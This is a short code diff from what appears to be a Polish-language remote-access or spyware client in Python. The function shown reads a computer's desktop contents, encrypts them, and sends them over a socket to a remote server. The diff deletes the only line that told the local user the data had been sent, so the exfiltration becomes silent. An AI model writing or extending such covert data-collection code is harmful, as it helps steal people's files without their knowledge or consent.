@@ -97,7 +97,6 @@ def odczytaj_zawartosc_pulpitu(server_socket):
         # Zamiast używać tabulatorów, użyjmy kilku znaków spacji
         formatted_response = formatted_response.replace('\t', '    ')
         server_socket.sendall(szyfrowanie(formatted_response).encode())
-        print('Zawartość pulpitu została wysłana na serwer.')
     except Exception as e:
         error_message = f'Wystąpił błąd podczas odczytu zawartości pulpitu: {e}'
         server_socket.sendall(szyfrowanie(error_message).encode())
